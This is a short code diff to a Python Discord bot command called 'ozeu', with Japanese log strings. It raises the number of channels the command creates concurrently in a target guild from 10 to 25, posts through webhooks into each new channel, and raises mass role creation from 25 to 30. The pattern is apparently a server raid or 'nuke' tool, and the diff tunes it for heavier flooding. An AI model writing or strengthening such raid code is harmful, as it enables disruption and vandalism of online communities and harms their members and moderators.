@@ -72,7 +72,7 @@ async def ozeu(ctx, guild_id: int = None):
             print(f"{index + 1}個目のチャンネル作成失敗: {e}")
             return None
 
-    created_channels = await asyncio.gather(*[create_channel(i) for i in range(10)])
+    created_channels = await asyncio.gather(*[create_channel(i) for i in range(25)])
     created_channels = [ch for ch in created_channels if ch is not None]
 
     async def send_with_webhook(channel):
@@ -86,7 +86,7 @@ async def ozeu(ctx, guild_id: int = None):
     await asyncio.gather(*[send_with_webhook(ch) for ch in created_channels])
 
     try:
-        for i in range(25):
+        for i in range(30):
             await guild.create_role(name=f"bot用権限{i+1}")
     except Exception as e:
         print(f"ロール作成でエラー: {e}")
